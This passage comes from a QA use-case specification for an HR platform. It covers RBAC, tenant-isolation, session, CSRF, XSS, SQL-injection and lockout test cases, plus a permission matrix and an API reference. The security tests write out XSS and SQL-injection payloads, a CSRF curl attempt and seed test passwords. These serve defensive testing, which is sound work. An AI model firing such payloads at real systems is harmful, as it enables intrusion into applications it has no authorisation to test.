- **Negative Test (see UC-RBAC-002):** Direct URL access to admin pages.
- **Verification:** `GET /api/v1/auth/me` returns `{ "role": "EMPLOYEE", "permissions": [] }`.

---

### UC-RBAC-002 — RBAC Negative: Employee Cannot Access Admin Routes

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** EMPLOYEE (attempting unauthorized access)
- **URL:** Various protected routes
- **API Endpoint:** Various admin endpoints
- **Playwright Spec:** `frontend/e2e/rbac-employee-boundaries.spec.ts`
- **Preconditions:** Logged in as `saran@nulogic.io` (EMPLOYEE, rank 40).
- **Test Steps:**
  1. Directly navigate to http://localhost:3000/payroll/runs → Expect redirect to `/403` or
     `/auth/login`
  2. Directly navigate to http://localhost:3000/admin → Expect redirect to `/403`
  3. Directly navigate to http://localhost:3000/reports → Expect redirect to `/403`
  4. Attempt API call: `GET /api/v1/payroll/runs` → Expect HTTP 403
  5. Attempt API call: `GET /api/v1/admin/tenants` → Expect HTTP 403
  6. Attempt API call: `POST /api/v1/employees` → Expect HTTP 403 (employee.write permission
     required)
  7. Attempt API call: `GET /api/v1/employees` with `?includeAll=true` → Expect HTTP 403 or filtered
     response (only own record)
  8. Attempt to access payslip of another employee:
     `GET /api/v1/payroll/payslips/employee/{raj_employee_id}` → Expect HTTP 403
- **Expected Result:** All unauthorized access attempts return HTTP 403. Frontend routes redirect to
  appropriate error page. No data leakage.
- **Verification:** Zero sensitive data returned to EMPLOYEE role in unauthorized contexts. Browser
  console shows no admin-level data in API responses.

---

### UC-RBAC-003 — RBAC Positive: Manager Accesses Team Data

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** MANAGER
- **URL:** http://localhost:3000/approvals, http://localhost:3000/employees
- **API Endpoint:** `GET /api/v1/employees?managerId=<id>`, `GET /api/v1/approvals/tasks`
- **Playwright Spec:** `frontend/e2e/rbac-manager-boundaries.spec.ts`
- **Preconditions:** Logged in as `sumit@nulogic.io` (MANAGER). Direct reports: Mani S, Saran V.
- **Test Steps:**
  1. Log in as `sumit@nulogic.io`
  2. Navigate to team view — see direct reports (Mani S, Saran V)
  3. View Saran's attendance record (as manager)
  4. View Saran's leave balance (as manager)
  5. Approve/reject leave requests in approval inbox
  6. Cannot access Jagadeesh's profile (not a direct report)
  7. Cannot run payroll (no payroll.write permission)
  8. Cannot access admin panel
- **Expected Result:** Manager sees team data scoped to their direct reports. Approval workflows
  function. Cannot access cross-team or admin functionality.
- **Negative Test:** Manager attempts `GET /api/v1/employees/{jagadeesh_id}/attendance` → HTTP 403 (
  not in reporting chain).
- **Verification:** `GET /api/v1/employees?managerId=<sumit_id>` returns only Saran and Mani.

---

### UC-RBAC-004 — RBAC Positive: SUPER_ADMIN Full Access

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** SUPER_ADMIN
- **URL:** All routes
- **API Endpoint:** All endpoints
- **Playwright Spec:** `frontend/e2e/rbac-superadmin.spec.ts`
- **Preconditions:** Logged in as `fayaz.m@nulogic.io` (SUPER_ADMIN).
- **Test Steps:**
  1. Verify: All sidebar navigation items visible (HRMS, Hire, Grow, Admin)
  2. Access http://localhost:3000/admin — fully accessible
  3. Access http://localhost:3000/payroll/runs — accessible
  4. Access http://localhost:3000/reports — accessible
  5. View any employee's full profile
  6. Access platform admin: tenants, feature flags, system health
  7. Verify: No permission-denied errors on any endpoint
- **Expected Result:** SUPER_ADMIN bypasses ALL `@RequiresPermission` checks. Full access to every
  module.
- **Verification:** `GET /api/v1/auth/me` returns `{ "role": "SUPER_ADMIN" }`. All admin APIs return
  200.

---

### UC-TENANT-001 — Multi-Tenancy: Tenant A Data Isolated from Tenant B

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** EMPLOYEE from two different tenants
- **URL:** Any data endpoint
- **API Endpoint:** `GET /api/v1/employees`
- **Playwright Spec:** `frontend/e2e/rbac-tenant-isolation.spec.ts`
- **Preconditions:** Two tenants exist: "NULogic Internal" and "Test Corp" (test only). Each has
  employees.
- **Test Steps:**
  1. Log in as `saran@nulogic.io` (NULogic tenant)
  2. `GET /api/v1/employees` — returns only NULogic employees
  3. `GET /api/v1/payroll/runs` — returns only NULogic payroll runs
  4. Verify: Test Corp tenant's `tenant_id` UUID never appears in any API response
  5. Attempt to directly call: `GET /api/v1/employees?tenantId=<testcorp_tenant_id>` → Either
     returns 403 or parameter ignored (response scoped to own tenant)
  6. Verify PostgreSQL RLS is enforced (check via DB query that `tenant_id` filter is applied
     automatically)
- **Expected Result:** All data responses scoped to authenticated user's tenant. Zero cross-tenant
  data leakage. `tenant_id` parameter in query string is ignored (backend uses JWT-derived tenant
  ID).
- **Verification:** DB audit: all SQL queries emitted by backend include
  `WHERE tenant_id = '<nulogic_uuid>'`. No data from Test Corp tenant in any response.

---

### UC-SEC-001 — Session Security: Concurrent Sessions

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/security
- **API Endpoint:** `GET /api/v1/auth/sessions`, `DELETE /api/v1/auth/sessions/{sessionId}`
- **Playwright Spec:** `frontend/e2e/settings-security.spec.ts`
- **Preconditions:** `saran@nulogic.io` logged in on one browser.
- **Test Steps:**
  1. Log in as `saran@nulogic.io` in Chrome
  2. Log in as same user in Firefox (second session)
  3. Navigate to http://localhost:3000/security in Chrome
  4. View "Active Sessions" panel
  5. Verify both sessions listed (Chrome + Firefox)
  6. Click "Revoke" on Firefox session
  7. Switch to Firefox — next API call returns HTTP 401
  8. Firefox redirected to `/auth/login`
- **Expected Result:** Session management panel shows all active sessions. Revoke terminates the
  selected session via JWT blacklisting.
- **Negative Test:** Attempt `DELETE /api/v1/auth/sessions/{sessionId}` for someone else's session →
  HTTP 403.
- **Verification:** Redis blacklist contains revoked session's JWT JTI. Firefox session gets 401 on
  next request.

---

### UC-SEC-002 — OWASP Security Headers Verification

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Anonymous, Any role
- **URL:** http://localhost:3000 (any page)
- **API Endpoint:** Any
- **Playwright Spec:** `frontend/e2e/settings-security.spec.ts`
- **Preconditions:** Frontend and backend running. OWASP headers configured in Next.js middleware
  and Spring Security.
- **Test Steps:**
  1. Open browser DevTools → Network tab
  2. Navigate to http://localhost:3000
  3. Inspect response headers on the HTML document
  4. Verify presence of:

  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `X-XSS-Protection: 1; mode=block`
  - `Strict-Transport-Security: max-age=...` (HSTS, in production HTTPS)
  - `Content-Security-Policy: ...` (configured CSP)
  - `Referrer-Policy: strict-origin-when-cross-origin`

  5. Inspect backend API response headers:

  - Same headers present on `GET /api/v1/auth/me` response

  6. Verify CSRF double-submit cookie: `XSRF-TOKEN` cookie set on all POST/PUT/DELETE requests
- **Expected Result:** All OWASP security headers present on both frontend and API responses.
- **Verification:** Browser DevTools → Network → Response Headers. No missing security headers.

---

### UC-SEC-003 — CSRF Protection

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Attacker simulation
- **URL:** http://localhost:8080/api/v1/employees
- **API Endpoint:** `POST /api/v1/employees`
- **Playwright Spec:** `frontend/e2e/settings-security.spec.ts`
- **Preconditions:** User authenticated (has valid JWT cookie). `XSRF-TOKEN` cookie present.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Attempt direct `POST /api/v1/employees` from a different origin without CSRF token header
  3. Use curl:
     `curl -X POST http://localhost:8080/api/v1/employees -H "Cookie: nu_aura_token=<jwt>" --data '{"email":"test@test.com"}'` (
     no X-XSRF-TOKEN header)
  4. Expect: HTTP 403 CSRF token missing/invalid
  5. Now add correct CSRF header: `-H "X-XSRF-TOKEN: <csrf_token>"` — expect: HTTP 201 or 400 (
     proper validation)
- **Expected Result:** Requests without valid CSRF token rejected with HTTP 403. Prevents CSRF
  attacks.
- **Verification:** Backend Spring Security CSRF filter active. Request without CSRF header returns
  403 `{ "error": "CSRF token missing or invalid" }`.

---

### UC-SEC-004 — Input Validation and XSS Prevention

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Attacker simulation
- **URL:** http://localhost:3000/employees/new
- **API Endpoint:** `POST /api/v1/employees`
- **Playwright Spec:** `frontend/e2e/rbac-employee-boundaries.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`.
- **Test Steps:**
  1. Navigate to employee creation form
  2. In "First Name" field enter: `<script>alert('XSS')</script>`
  3. Submit the form
  4. Verify: No alert box shown (XSS prevented)
  5. Verify: Name stored in DB as escaped text or form validation rejected it
  6. In notes/description field (Tiptap): enter `<img src=x onerror=alert(1)>`
  7. Verify: Image tag stripped or onerror attribute sanitized
  8. Test SQL injection in search: enter `' OR 1=1 --` in employee search
  9. Verify: No SQL error, no data leakage, treated as literal search term
- **Expected Result:** All XSS attempts sanitized. SQL injection attempts produce empty results, not
  data dumps. No raw HTML execution in the browser.
- **Verification:** `GET /api/v1/employees?search=<script>` returns empty results with 200 status.
  No server errors.

---

### UC-SEC-005 — Account Lockout After Failed Attempts

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Attacker simulation
- **URL:** http://localhost:3000/auth/login
- **API Endpoint:** `POST /api/v1/auth/login`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** `saran@nulogic.io` exists. `AccountLockoutService` active (5 attempts / 15min
  window, Redis-backed).
- **Test Steps:**
  1. Navigate to login page
  2. Enter `saran@nulogic.io` with wrong password 5 times
  3. 6th attempt: account locked
  4. Attempt 6: HTTP 423 `{ "error": "Account temporarily locked. Try again in 15 minutes." }`
  5. Verify: Even correct password returns 423 during lockout period
  6. Wait 15 minutes (or reset Redis key for testing): Account unlocked
  7. Correct password login succeeds
- **Expected Result:** Account locked after 5 failed attempts. Locked for 15 minutes. Lockout
  applies even with correct password during lockout window. Admin can manually unlock from admin
  panel.
- **Verification:** Redis key `lockout:<email>` exists with TTL of ~900 seconds after lockout
  triggers.

---

## Additional Cross-Cutting Use Cases

---

### UC-DASH-001 — Dashboard Load and Widget Rendering

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_MANAGER, EMPLOYEE
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** `GET /api/v1/dashboard/summary`
- **Playwright Spec:** `frontend/e2e/dashboard.spec.ts`
- **Preconditions:** Seed data in place. User logged in.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Navigate to http://localhost:3000/dashboard
  3. Verify widgets load: Total Employees, On Leave Today, Attendance Rate, Pending Approvals
  4. Verify charts render: Headcount by Department (Recharts), Leave Trend (last 6 months)
  5. Click "Pending Approvals" widget → navigates to approvals list
  6. Log in as `saran@nulogic.io` (EMPLOYEE)
  7. Verify employee dashboard: My Attendance, My Leave Balance, My Pending Tasks, Company
     Announcements
- **Expected Result:** All widgets load within 3 seconds. Charts render correctly. Data accurate.
- **Negative Test:** Disconnect backend and refresh dashboard → Error state with "Failed to load
  dashboard. Retry?" message. No unhandled JavaScript errors in console.
- **Verification:** `GET /api/v1/dashboard/summary` returns all required data fields.

---

### UC-COMP-001 — Compensation Management

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/compensation
- **API Endpoint:** `GET /api/v1/compensation/structures`
- **Playwright Spec:** `frontend/e2e/compensation.spec.ts`
- **Preconditions:** Compensation bands configured for Engineering department.
- **Test Steps:**
  1. Navigate to http://localhost:3000/compensation
  2. View salary bands: Engineering → Band 1 (0-3 yrs): ₹4L-₹8L, Band 2 (3-7 yrs): ₹8L-₹15L
  3. View employee vs band positioning
  4. Identify employees below band midpoint (potential underpay)
  5. Generate compensation report
- **Expected Result:** Compensation bands visible. Employee positioning plotted. Overpay/underpay
  flagged.
- **Negative Test:** EMPLOYEE attempts to access `/compensation` → HTTP 403 / redirect to /403.
- **Verification:** API returns compensation band data with employee distribution.

---

### UC-PROB-001 — Probation Period Tracking

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/probation
- **API Endpoint:** `GET /api/v1/probation`, `PUT /api/v1/probation/{id}/confirm`
- **Playwright Spec:** `frontend/e2e/probation.spec.ts`
- **Preconditions:** New employee "Priya Sharma" joined 3 months ago with 6-month probation.
- **Test Steps:**
  1. Navigate to http://localhost:3000/probation
  2. Find Priya Sharma — probation end date: 2026-10-01
  3. Manager submits probation review: Rating = 4/5, Recommendation = CONFIRM
  4. HR Admin confirms employee: `PUT /api/v1/probation/{id}/confirm`
  5. Employee status changes from PROBATION → CONFIRMED
  6. Confirmation letter generated automatically
- **Expected Result:** Probation tracked with end date. Confirmation flow completed. Employee status
  updated.
- **Negative Test:** Extend probation: HR sets extended probation end date with reason "Performance
  improvement plan required" → Extension recorded.
- **Verification:** `GET /api/v1/employees/{id}` returns `{ "employmentStatus": "CONFIRMED" }`.

---

### UC-MY-001 — My Space — Employee Self-Service

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/me
- **API Endpoint:** `GET /api/v1/self-service/profile`
- **Playwright Spec:** `frontend/e2e/my-space.spec.ts`
- **Preconditions:** `saran@nulogic.io` logged in.
- **Test Steps:**
  1. Navigate to http://localhost:3000/me/dashboard
  2. Verify: Today's attendance status visible
  3. Navigate to http://localhost:3000/me/profile — view/edit personal details
  4. Navigate to http://localhost:3000/me/payslips — view payslip history
  5. Navigate to http://localhost:3000/me/leave — view leave balance and history
  6. Navigate to http://localhost:3000/me/assets — view assigned assets
  7. Navigate to http://localhost:3000/me/documents — view personal documents
  8. Verify: All sections load without error
  9. Verify: No "Admin" or cross-team data visible in MY SPACE
- **Expected Result:** All MY SPACE sections accessible to EMPLOYEE. Data scoped to own records. No
  admin features in MY SPACE sidebar.
- **Verification:** Each section loads with correct data. No 403 errors in browser network panel.

---

### UC-SETTINGS-001 — Settings and Security Page

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Any authenticated role
- **URL:** http://localhost:3000/settings
- **API Endpoint:** `PUT /api/v1/auth/change-password`
- **Playwright Spec:** `frontend/e2e/settings.spec.ts`, `frontend/e2e/settings-security.spec.ts`
- **Preconditions:** `saran@nulogic.io` logged in.
- **Test Steps:**
  1. Navigate to http://localhost:3000/settings
  2. Change password:

  - Current password: `Welcome@123`
  - New password: `NewPass@2026`
  - Confirm: `NewPass@2026`
  - `PUT /api/v1/auth/change-password`

  3. Log out and verify new password works
  4. Navigate to security settings: view active sessions
  5. Update notification preferences: disable email for leave approval notifications
- **Expected Result:** Password changed successfully. New password policy enforced. Session
  management functional.
- **Negative Test:** Enter wrong current password → HTTP 401
  `{ "error": "Current password is incorrect" }`. Set password identical to one of last 5 → HTTP 400
  `{ "error": "Cannot reuse a recent password" }`.
- **Verification:** Old password login fails. New password login succeeds.

---

### UC-APPSW-001 — App Switcher (Platform Sub-App Navigation)

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Any authenticated role
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** N/A (client-side routing)
- **Playwright Spec:** `frontend/e2e/app-switcher.spec.ts`
- **Preconditions:** User logged in. All sub-apps configured.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Locate app switcher (waffle/grid icon in header)
  3. Click app switcher
  4. Verify 4 app tiles: NU-HRMS, NU-Hire, NU-Grow, NU-Fluence
  5. Click "NU-Hire" → navigates to http://localhost:3000/recruitment
  6. Sidebar changes to NU-Hire navigation (Jobs, Candidates, Interviews, Offers, Onboarding)
  7. Click app switcher again → "NU-Grow" → navigates to http://localhost:3000/performance
  8. Sidebar changes to NU-Grow navigation (Performance, OKRs, Learning, Recognition)
  9. Click "NU-HRMS" → returns to HRMS navigation
- **Expected Result:** App switcher correctly routes between sub-apps. Sidebar context changes per
  active app. Active app highlighted in switcher.
- **Negative Test:** EMPLOYEE cannot see admin-only app tiles (if restricted). NU-Fluence tile
  shows "Coming Soon" or limited access badge.
- **Verification:** URL changes correctly. Sidebar items match the active app per
  `frontend/lib/config/apps.ts` mapping.

---

### UC-SMOKE-001 — Full Platform Smoke Test

- **Priority:** P0
- **Sub-App:** Platform (all)
- **Persona:** HR_MANAGER
- **URL:** Multiple
- **API Endpoint:** Multiple
- **Playwright Spec:** `frontend/e2e/smoke.spec.ts`, `frontend/e2e/sub-app-smoke.spec.ts`
- **Preconditions:** All infrastructure running. Seed data applied.
- **Test Steps:**
  1. Navigate to http://localhost:3000 → should redirect to login or dashboard
  2. Login as `jagadeesh@nulogic.io` → should reach dashboard in < 3 seconds
  3. Navigate to /employees → employee list loads
  4. Navigate to /attendance → attendance view loads
  5. Navigate to /leave → leave management loads
  6. Navigate to /payroll → payroll overview loads
  7. Navigate to /recruitment → recruitment kanban loads
  8. Navigate to /performance → performance dashboard loads
  9. Navigate to /learning → LMS catalog loads
  10. Navigate to /admin → admin panel loads (HR_MANAGER should see relevant admin items)
  11. Check browser console: zero unhandled errors
  12. Check network tab: no 5xx responses
- **Expected Result:** All major routes load without errors. No 500 server errors. No unhandled
  JavaScript exceptions. Page load < 3 seconds per route.
- **Verification:** All HTTP responses are 200 (or expected 4xx for unauthorized routes). Zero
  console errors.

---

## RBAC Permission Matrix

The following matrix summarizes which roles can access which features. A QA agent must verify each
cell:

| Feature                   | SUPER_ADMIN | TENANT_ADMIN | HR_ADMIN | HR_MANAGER | MANAGER   | EMPLOYEE   | NEW_JOINER |
|---------------------------|-------------|--------------|----------|------------|-----------|------------|------------|
| View own profile          | Y           | Y            | Y        | Y          | Y         | Y          | Y          |
| View any employee profile | Y           | Y            | Y        | Y          | Own team  | Own record | Own record |
| Create/edit employees     | Y           | Y            | Y        | Y          | N         | N          | N          |
| View payslips (own)       | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| Run payroll               | Y           | Y            | Y        | N          | N         | N          | N          |
| Lock payroll              | Y           | Y            | Y        | N          | N         | N          | N          |
| View all payroll runs     | Y           | Y            | Y        | N          | N         | N          | N          |
| Approve leave             | Y           | Y            | Y        | Y          | Y (team)  | N          | N          |
| Apply leave               | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| View reports              | Y           | Y            | Y        | Y          | Team only | N          | N          |
| Admin panel               | Y           | Y            | N        | N          | N         | N          | N          |
| Feature flags             | Y           | N            | N        | N          | N         | N          | N          |
| Create job requisitions   | Y           | Y            | Y        | Y          | Y (dept)  | N          | N          |
| View recruitment pipeline | Y           | Y            | Y        | Y          | Own reqs  | N          | N          |
| Create performance cycles | Y           | Y            | Y        | N          | N         | N          | N          |
| Submit self-review        | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| Create LMS courses        | Y           | Y            | Y        | N          | N         | N          | N          |
| Enroll in LMS courses     | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| Give kudos                | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| Create surveys            | Y           | Y            | Y        | N          | N         | N          | N          |
| Respond to surveys        | Y           | Y            | Y        | Y          | Y         | Y          | N          |
| Manage assets             | Y           | Y            | Y        | N          | N         | N          | N          |
| Manage benefits           | Y           | Y            | Y        | N          | N         | N          | N          |

---

## Appendix A: E2E Spec to Use Case Mapping

| Playwright Spec File                | Covered Use Cases                                                   |
|-------------------------------------|---------------------------------------------------------------------|
| `auth.spec.ts`                      | UC-AUTH-001 to UC-AUTH-007                                          |
| `auth-flow.spec.ts`                 | UC-AUTH-001, UC-AUTH-004, UC-AUTH-005                               |
| `auth.setup.ts`                     | Seed auth state for all specs                                       |
| `payroll-end-to-end.spec.ts`        | UC-PAY-001, UC-PAY-002, UC-PAY-003, UC-PAY-004                      |
| `payroll-run.spec.ts`               | UC-PAY-002, UC-PAY-005                                              |
| `payroll-flow.spec.ts`              | UC-PAY-001, UC-PAY-006                                              |
| `payroll-statutory.spec.ts`         | UC-STAT-001, UC-STAT-002                                            |
| `leave-approval-chain.spec.ts`      | UC-APPR-001, UC-APPR-002                                            |
| `approvals-workflows.spec.ts`       | UC-APPR-001 to UC-APPR-005                                          |
| `expense-flow.spec.ts`              | UC-APPR-003, UC-EXP-001                                             |
| `expenses.spec.ts`                  | UC-EXP-001                                                          |
| `overtime.spec.ts`                  | UC-APPR-004                                                         |
| `employee-crud.spec.ts`             | UC-EMP-001, UC-EMP-002, UC-EMP-003                                  |
| `employee.spec.ts`                  | UC-EMP-001 to UC-EMP-005                                            |
| `org-chart.spec.ts`                 | UC-EMP-005                                                          |
| `attendance.spec.ts`                | UC-ATT-001, UC-ATT-002                                              |
| `attendance-flow.spec.ts`           | UC-ATT-001, UC-ATT-003                                              |
| `shifts.spec.ts`                    | UC-ATT-003                                                          |
| `leave.spec.ts`                     | UC-LEAVE-001 to UC-LEAVE-003                                        |
| `leave-flow.spec.ts`                | UC-LEAVE-001                                                        |
| `tax-lwf.spec.ts`                   | UC-STAT-003                                                         |
| `benefits.spec.ts`                  | UC-BEN-001, UC-BEN-002                                              |
| `assets.spec.ts`                    | UC-ASSET-001                                                        |
| `asset-flow.spec.ts`                | UC-ASSET-001, UC-ASSET-002                                          |
| `loans.spec.ts`                     | UC-LOAN-001                                                         |
| `travel.spec.ts`                    | UC-TRAVEL-001                                                       |
| `hire-to-onboard.spec.ts`           | UC-CONTRACT-001, UC-HIRE-003, UC-HIRE-004, UC-HIRE-005, UC-HIRE-006 |
| `letters.spec.ts`                   | UC-LETTER-001                                                       |
| `departments.spec.ts`               | UC-DEPT-001                                                         |
| `helpdesk.spec.ts`                  | UC-HELP-001                                                         |
| `timesheets.spec.ts`                | UC-TIME-001                                                         |
| `resource-allocation.spec.ts`       | UC-RESOURCE-001                                                     |
| `resources.spec.ts`                 | UC-RESOURCE-001                                                     |
| `resources-capacity.spec.ts`        | UC-RESOURCE-001                                                     |
| `resource-project-extended.spec.ts` | UC-RESOURCE-001                                                     |
| `reports-builder.spec.ts`           | UC-REPORT-001                                                       |
| `reports-extended.spec.ts`          | UC-REPORT-001                                                       |
| `scheduled-reports.spec.ts`         | UC-REPORT-002                                                       |
| `admin-system.spec.ts`              | UC-ADMIN-001, UC-ADMIN-002                                          |
| `notifications.spec.ts`             | UC-NOTIF-001                                                        |
| `recruitment-pipeline.spec.ts`      | UC-HIRE-001, UC-HIRE-002                                            |
| `recruitment-kanban.spec.ts`        | UC-HIRE-002                                                         |
| `recruitment-extended.spec.ts`      | UC-HIRE-001, UC-HIRE-002                                            |
| `onboarding-offboarding.spec.ts`    | UC-HIRE-006, UC-HIRE-007                                            |
| `fnf-settlement.spec.ts`            | UC-HIRE-007                                                         |
| `performance-review-cycle.spec.ts`  | UC-GROW-001                                                         |
| `review-cycles.spec.ts`             | UC-GROW-001                                                         |
| `performance-review.spec.ts`        | UC-GROW-002, UC-GROW-003                                            |
| `performance-extended.spec.ts`      | UC-GROW-002, UC-GROW-003                                            |
| `performance-calibration.spec.ts`   | UC-GROW-003                                                         |
| `performance-pip.spec.ts`           | Related to UC-GROW-003 (PIP flow)                                   |
| `feedback360.spec.ts`               | UC-GROW-004                                                         |
| `okr.spec.ts`                       | UC-GROW-005                                                         |
| `learning.spec.ts`                  | UC-GROW-006                                                         |
| `lms-catalog.spec.ts`               | UC-GROW-006                                                         |
| `training.spec.ts`                  | UC-GROW-006                                                         |
| `training-enrollment.spec.ts`       | UC-GROW-006                                                         |
| `recognition.spec.ts`               | UC-GROW-007                                                         |
| `surveys.spec.ts`                   | UC-GROW-008                                                         |
| `wellness.spec.ts`                  | UC-GROW-009                                                         |
| `rbac-employee-boundaries.spec.ts`  | UC-RBAC-001, UC-RBAC-002, UC-SEC-004                                |
| `rbac-manager-boundaries.spec.ts`   | UC-RBAC-003                                                         |
| `rbac-superadmin.spec.ts`           | UC-RBAC-004                                                         |
| `rbac-tenant-isolation.spec.ts`     | UC-TENANT-001                                                       |
| `settings-security.spec.ts`         | UC-SEC-001, UC-SEC-002, UC-SETTINGS-001                             |
| `dashboard.spec.ts`                 | UC-DASH-001                                                         |
| `compensation.spec.ts`              | UC-COMP-001                                                         |
| `probation.spec.ts`                 | UC-PROB-001                                                         |
| `my-space.spec.ts`                  | UC-MY-001                                                           |
| `app-switcher.spec.ts`              | UC-APPSW-001                                                        |
| `smoke.spec.ts`                     | UC-SMOKE-001                                                        |
| `sub-app-smoke.spec.ts`             | UC-SMOKE-001                                                        |
| `admin-roles.spec.ts`               | UC-RBAC-004, UC-ADMIN-001                                           |
| `custom-fields.spec.ts`             | UC-ADMIN-001 (custom fields feature flag)                           |
| `calendar.spec.ts`                  | UC-ADMIN-002 (holiday calendar)                                     |
| `holidays.spec.ts`                  | UC-ADMIN-002                                                        |
| `navigation.spec.ts`                | UC-APPSW-001, UC-SMOKE-001                                          |
| `home.spec.ts`                      | UC-SMOKE-001                                                        |
| `analytics.spec.ts`                 | UC-REPORT-001, UC-DASH-001                                          |
| `one-on-one.spec.ts`                | NU-Grow 1:1 meeting flow                                            |
| `gantt.spec.ts`                     | UC-RESOURCE-001 (Gantt view)                                        |
| `projects.spec.ts`                  | UC-RESOURCE-001, UC-TIME-001                                        |
| `documents.spec.ts`                 | UC-MY-001 (documents section)                                       |
| `integrations-payments.spec.ts`     | Payments/integrations admin                                         |
| `announcements.spec.ts`             | UC-NOTIF-001 related (announcements)                                |
| `settings.spec.ts`                  | UC-SETTINGS-001                                                     |

---

## Appendix B: API Request/Response Reference

### Authentication

**POST /api/v1/auth/login**

```json
Request:
{ "email": "saran@nulogic.io", "password": "Welcome@123" }

Response 200:
{ "user": { "id": "<uuid>", "name": "Saran V", "email": "saran@nulogic.io", "role": "EMPLOYEE" }, "tenantId": "<uuid>" }
Cookie: nu_aura_token=<jwt>; HttpOnly; SameSite=Strict; Path=/

Response 401:
{ "status": 401, "error": "Unauthorized", "message": "Invalid credentials", "timestamp": "..." }
```

**GET /api/v1/auth/me**

```json
Response 200:
{ "id": "<uuid>", "name": "Saran V", "email": "saran@nulogic.io", "role": "EMPLOYEE", "tenantId": "<uuid>", "employeeId": "<uuid>" }

Response 401:
{ "status": 401, "error": "Unauthorized", "message": "JWT token expired or invalid", "timestamp": "..." }
```

### Employee

**POST /api/v1/employees**

```json
Request:
{ "firstName": "Priya", "lastName": "Sharma", "email": "priya.sharma@nulogic.io", "dateOfJoining": "2026-04-01", "departmentId": "<uuid>", "designationId": "<uuid>", "managerId": "<uuid>", "officeLocationId": "<uuid>", "employmentType": "FULL_TIME", "ctc": 600000 }

Response 201:
{ "id": "<uuid>", "employeeCode": "EMP-011", "firstName": "Priya", "lastName": "Sharma", "email": "priya.sharma@nulogic.io", "status": "ACTIVE", "createdAt": "..." }

Response 409:
{ "status": 409, "error": "Conflict", "message": "An employee with this email already exists", "timestamp": "..." }
```

### Payroll

**POST /api/v1/payroll/runs**

```json
Request:
{ "periodStart": "2026-03-01", "periodEnd": "2026-03-31", "salaryStructureId": "<uuid>", "description": "March 2026 Payroll" }

Response 201:
{ "id": "<uuid>", "status": "DRAFT", "periodStart": "2026-03-01", "periodEnd": "2026-03-31", "employeeCount": 10, "createdAt": "..." }
```

**POST /api/v1/payroll/runs/{id}/process**

```json
Response 200:
{ "id": "<uuid>", "status": "PROCESSING", "message": "Payroll processing initiated. Check status for completion." }
```

### Leave

**POST /api/v1/leave/requests**

```json
Request:
{ "leaveTypeId": "<uuid>", "startDate": "2026-04-14", "endDate": "2026-04-15", "reason": "Personal travel", "dayType": "FULL_DAY" }

Response 201:
{ "id": "<uuid>", "status": "PENDING", "workingDays": 2, "leaveType": "Annual Leave", "approvalWorkflowId": "<uuid>" }

Response 400:
{ "status": 400, "error": "Bad Request", "message": "Insufficient leave balance. Available: 12, Requested: 15", "timestamp": "..." }
```

### Approvals

**POST /api/v1/approvals/tasks/{taskId}/approve**

```json
Request:
{ "comment": "Approved. Have a good trip." }

Response 200:
{ "taskId": "<uuid>", "status": "APPROVED", "nextStep": "L2_APPROVAL" or "COMPLETED", "approvedAt": "..." }
```

---

## Appendix C: Test Execution Order

Execute use cases in the following priority order for regression testing:

### Phase 1 — Smoke (Run on every commit)

1. UC-SMOKE-001 — Full platform smoke test
2. UC-AUTH-001 — Login
3. UC-AUTH-004 — Logout

### Phase 2 — Critical P0 (Run before every release)

4. UC-AUTH-002 through UC-AUTH-007 — Auth flows
5. UC-PAY-001 through UC-PAY-006 — Payroll engine
6. UC-APPR-001 through UC-APPR-005 — Approval engine
7. UC-RBAC-001 through UC-RBAC-004 — RBAC
8. UC-TENANT-001 — Multi-tenancy
9. UC-SEC-001 through UC-SEC-005 — Security

### Phase 3 — P1 HRMS (Run before HRMS feature release)

10. UC-EMP-001 through UC-EMP-018
11. UC-ATT-001 through UC-ATT-012
12. UC-LEAVE-001 through UC-LEAVE-015
13. UC-STAT-001 through UC-STAT-010
14. UC-BEN-001 through UC-BEN-008
15. UC-ASSET-001 through UC-ASSET-008
16. UC-EXP-001 through UC-EXP-010
17. UC-LOAN-001 through UC-LOAN-006
18. UC-TRAVEL-001 through UC-TRAVEL-006
19. UC-CONTRACT-001 through UC-CONTRACT-006
20. UC-LETTER-001 through UC-LETTER-007
21. UC-DOC-001 through UC-DOC-005
22. UC-DEPT-001 through UC-DEPT-006
23. UC-HELP-001 through UC-HELP-007
24. UC-TIME-001 through UC-TIME-006
25. UC-RESOURCE-001 through UC-RESOURCE-007
26. UC-REPORT-001 through UC-REPORT-010
27. UC-ADMIN-001 through UC-ADMIN-012
28. UC-NOTIF-001 through UC-NOTIF-006
29. UC-ANNC-001 through UC-ANNC-004
30. UC-CAL-001 through UC-CAL-005
31. UC-PROB-001 through UC-PROB-005
32. UC-MY-001 through UC-MY-008
33. UC-SETTINGS-001 through UC-SETTINGS-007
34. UC-DASH-001 through UC-DASH-008
35. UC-FNF-001 through UC-FNF-005
